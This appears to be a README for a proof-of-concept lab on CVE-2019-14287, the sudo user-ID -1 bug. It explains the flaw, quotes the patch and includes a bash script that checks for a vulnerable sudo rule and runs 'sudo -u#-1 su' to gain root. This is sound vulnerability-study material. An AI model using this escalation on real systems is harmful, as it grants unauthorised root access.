# [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)

This is a simple PoC for CVE-2019-14287 affecting versions of sudo older than 1.8.28. The vulnerability here is a simple integer underflow error in the uid checking functionality of sudo. 

The issue stemmed from the value -1 being interpreted as 0 for the user ID. The user would need a line in the sudoers file that specified that they can RUNAS ALL, but also !root. Since the UID value -1 was technically not 0, the program would allow the user to run as -1, but then -1 would be interpreted as 0 when the user logged in making it a root login.

### The patch
Here was the part of the patch which disabled the ability to use -1 as the user.
```c
+	/* Disallow id -1, which means "no change". */
+	if (!valid_separator(p, ep, sep) || lval == -1) {

...

+	/* Disallow id -1, which means "no change". */
+	if (!valid_separator(p, ep, sep) || ulval == UINT_MAX) {
+	    if (errstr != NULL)
+		*errstr = N_("invalid value");
+	    errno = EINVAL;
```
### The exploit
This is a pretty simple vulnerability, but I wanted get some practice building the environment for vulnerabilities. I created two Dockerfiles: one with the vulnerable version of sudo (1.8.27) and one with the patched version (1.8.28). Otherwise, they were both the same. I built a simple program to test the version of sudo and run the exploit if the vulnerability exists.

```bash
#! /bin/bash

sudo_version=$(sudo -V | head -n 1 | awk '{print $3}')
echo $sudo_version
min_version="1.8.28"
something=$(printf '%s\n' "$sudo_version" "$min_version" | sort -V | tail -n1)
if [[ "$something" == "$min_version" ]]; then
	echo "Your sudo version ($sudo_version) is older than $min_version. You can attack this"
else
	echo "Your sudo version ($sudo_version) is newer than $min_version. The vulnerability has been patched"
fi

perm_check=$(sudo -l | grep -E '(\(ALL\)|\(ALL, !root\))')
error_string="Sorry"

if grep -q "$error_string" <<< "$perm_check"; then
	echo "You do not have the proper permissions for this"
else
	sudo -u#-1 su
fi
```

## References
- [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)


## How to use

Build the Dockerfile for either the vulnerable or patched version:
```bash
docker build . -t cve-2019-14287
```

Run the Dockerfile (this will log in as testuser):
```bash
docker run -it cve-2019-14287
```

Run the exploit:
```bash
$ privesc.sh
```
